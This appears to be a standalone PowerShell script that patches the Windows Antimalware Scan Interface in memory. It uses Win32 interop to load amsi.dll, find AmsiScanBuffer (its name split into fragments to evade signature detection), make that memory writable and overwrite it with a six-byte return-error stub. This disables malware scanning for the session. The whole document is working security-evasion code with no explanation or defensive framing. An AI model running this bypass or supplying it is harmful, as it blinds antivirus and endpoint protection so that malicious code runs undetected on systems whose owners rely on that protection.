$in = @"
using System; using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $in

$f = 0

$as = New-Object byte[] 6

$as[0] = 0xB8
$as[1] = 0x57
$as[2] = 0x00
$as[3] = 0x07
$as[4] = 0x80
$as[5] = 0xC3

$Lib = [Win32]::LoadLibrary("a"+"m" + "si" + ".d"+"ll")
$ress = [Win32]::GetProcAddress($Lib, "Am"+"si" + "Scan" + "Buf" + "f"+"er")

[Win32]::VirtualProtect($ress, [uint32]5, 0x40, [ref]$f)
[System.Runtime.InteropServices.Marshal]::Copy($as, 0, $ress, 6)

